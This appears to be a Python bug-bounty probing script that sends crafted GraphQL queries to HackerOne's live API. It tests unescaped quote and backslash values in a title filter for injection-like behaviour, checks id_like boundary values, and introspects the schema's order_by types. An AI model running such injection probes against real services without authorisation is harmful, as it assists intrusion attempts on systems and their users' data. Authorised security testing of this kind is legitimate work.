# -*- coding: utf-8 -*-
"""h1x49c: 复测 %'% 超时 + order_by 类型 + id_like 边界"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0'})
Q = chr(39)

def qr(name, qstr, timeout=25):
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': qstr}, timeout=timeout)
        print(f'--- {name} ---')
        print(f'  [{r.status_code}] {r.text[:250]}')
    except Exception as e:
        print(f'--- {name} ERR {type(e).__name__}: {e} ---')

# 复测超时案例(改小字段+timeout)
qr('retry_quote1', '{ reports(where: {title: {_like: "%' + Q + '%"}}) { total_count } }')
qr('retry_quote2', '{ reports(where: {title: {_like: "%' + Q + '%"}}) { total_count } }')
# 转义双引号对照(应正常)
qr('retry_dquote', '{ reports(where: {title: {_like: "%\\"%"}}) { total_count } }')
# 反斜杠
qr('retry_bs', '{ reports(where: {title: {_like: "%\\\\%"}}) { total_count } }')
# id_like 边界
qr('idlike_0', '{ reports(where: {id_like: 0}) { total_count } }')
qr('idlike_9', '{ reports(where: {id_like: 9}) { total_count } }')
qr('idlike_big', '{ reports(where: {id_like: 3732660}) { total_count } }')
# order_by introspection
r = s.post('https://hackerone.com/graphql', json={'query': '{ __type(name: "Query") { fields { name args { name type { kind name ofType { kind name ofType { name } } } } } } }'}, timeout=20)
import json
j = r.json()
for f in j['data']['__type']['fields']:
    if f['name'] in ('reports',):
        for a in f['args']:
            if a['name'] in ('order_by', 'secure_order_by'):
                t = a['type']
                tn = t['name'] or (t.get('ofType') or {}).get('name') or ((t.get('ofType') or {}).get('ofType') or {}).get('name')
                print('reports arg', a['name'], '->', tn)
